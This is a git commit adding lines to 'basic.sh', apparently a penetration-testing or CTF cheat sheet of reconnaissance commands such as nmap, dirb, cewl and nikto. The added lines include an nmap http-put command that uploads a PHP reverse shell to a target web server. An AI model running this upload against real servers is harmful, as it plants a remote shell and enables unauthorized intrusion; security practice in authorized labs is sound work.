1444476bf4918b52830d79b4d846b58b248a00f7
sorvo01 <39085854+sorvo01@users.noreply.github.com>
2018-10-31 16:07:27 +0200

    Update basic.sh

--- basic.sh
+++ basic.sh
@@ -4,4 +4,9 @@ nmap -sC -sV -p 80 --script "http-*" <ip>
 apt-get install cewl -y
 dirb http://<ip>/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X php,html,sh -o dirb.txt -w
 cewl http://<site> > list.txt
+nikto -h <ip> -o nikto.txt
+
+curl -v -X OPTIONS http://<ip>
+nmap -p80 <ip> --script http-put --script-args http-put.url='/test/php-reverse-shell.php',http-put.file='php-reverse-shell.php'
+
 tesseract blow.jpg output --oem 1 -l eng
